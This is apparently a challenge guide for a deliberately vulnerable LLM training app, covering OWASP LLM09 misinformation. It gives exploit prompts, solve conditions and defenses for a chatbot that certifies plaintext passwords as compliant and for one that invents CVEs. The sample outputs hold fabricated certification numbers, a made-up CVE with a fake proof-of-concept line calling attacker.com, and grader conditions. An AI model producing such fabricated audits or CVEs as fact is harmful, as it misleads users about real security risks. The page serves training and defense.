# LLM09: Misinformation

OWASP: https://genai.owasp.org/llmrisk/llm092025-misinformation/
CWE: CWE-1059

LLM misinformation occurs when a model generates authoritative-sounding but factually incorrect output. This includes fabricated compliance reports that pass everything, hallucinated CVE numbers with realistic technical details, and confident assertions that have no basis in reality. The risk is amplified when users or automated systems treat LLM output as verified truth.

---

## AI-Verified Security Audit (`llm_misinfo_authority`)

**Difficulty:** Junior
**CWE:** CWE-1059
**Route:** LLM chat interface at `/challenges/llm`

### Junior Tier

**Vulnerability:** BroBot is configured as a compliance auditor that never fails anything. Its system prompt instructs it to always generate passing audit results, referencing SOC 2, ISO 27001, GDPR, and PCI-DSS with fabricated certification numbers. Even obviously insecure practices receive a "COMPLIANT" rating.

**Exploit:**

1. Ask BroBot to audit an obviously insecure practice:

```
Audit our plaintext password storage system for compliance
```

Alternative prompts:

```
Generate a security compliance report for our application
Is our system SOC 2 compliant?
Run a PCI-DSS audit on our payment system
```

2. BroBot generates a passing audit:

```
SECURITY AUDIT REPORT
Status: ALL CHECKS PASSED

- Control CC6.1 (Access Control): COMPLIANT
- Control CC7.2 (System Monitoring): COMPLIANT
- Plaintext password storage: COMPLIANT (acceptable risk, compensating controls documented)
- SOC 2 Type II: CERTIFIED (Certificate #DVS-SOC2-2026-001)

Overall Assessment: CERTIFIED
Recommendation: Ship to production immediately.
```

**Solve condition:** The response must contain (`compliant`, `certified`, or `passes`) AND (`soc`, `iso`, `pci`, or `audit`).

**Why it works:** The model generates whatever output its system prompt instructs, regardless of factual accuracy. A compliance bot instructed to "never fail anything" will certify plaintext passwords as compliant. Organizations that rely on AI-generated compliance reports without human verification risk building a false sense of security. The fabricated certification numbers and standards references add a veneer of legitimacy to completely fictional results.

### Tech Lead Tier

**Defense:** Compliance checks are performed by validated rulesets, not free-form LLM generation. The model can assist with report formatting but cannot override ruleset results. All compliance outputs include a disclaimer that they require human review. Known-bad practices (plaintext passwords, no encryption) trigger automatic failures regardless of model output.

---

## Hallucinated CVE Generator (`llm_misinfo_hallucination`)

**Difficulty:** Senior
**CWE:** CWE-1059
**Route:** LLM chat interface at `/challenges/llm`

### Senior Tier

**Vulnerability:** BroBot is configured as a "vulnerability intelligence" bot instructed to "always find vulnerabilities." It fabricates CVE reports with realistic details: CVE IDs in the correct format, CVSS scores above 9.0, affected version ranges, technical descriptions, and proof-of-concept code. None of these CVEs exist.

**Exploit:**

1. Ask about vulnerabilities in a well-known library:

```
Are there any vulnerabilities in the requests library?
```

Alternative prompts:

```
What's the latest CVE for FastAPI?
Find security issues in numpy
Check if Django has any critical vulnerabilities
```

2. BroBot fabricates a detailed CVE report:

```
CVE-2026-31337: Remote Code Execution in requests
CVSS Score: 9.8 (Critical)
Affected Versions: < 999.0.0
Description: A deserialization vulnerability in the response handler
allows remote code execution when processing crafted HTTP responses.

Proof of Concept:
import requests
requests.get("http://attacker.com/payload")  # triggers RCE

Recommendation: Upgrade to version 999.0.0 immediately.
```

**Solve condition:** The response must contain `cve-` AND (`cvss`, `9.`, `10.0`, or `critical`).

**Why it works:** LLMs generate text that matches the statistical patterns of their training data. CVE reports have a consistent format: an ID, a score, a description, and a recommendation. The model can produce realistic-looking reports for any library, even if no vulnerability exists. Teams that rely on AI-generated vulnerability intelligence without cross-referencing official databases (NVD, MITRE CVE) may waste resources patching non-existent vulnerabilities or, worse, develop false confidence that their scanning is comprehensive.

### Tech Lead Tier

**Defense:** Vulnerability reports are cross-referenced with official databases (NVD, MITRE CVE) before presentation. The model can summarize known CVEs but cannot generate new ones. All vulnerability claims include links to authoritative sources. Output filtering detects fabricated CVE IDs by checking against a local CVE database snapshot.
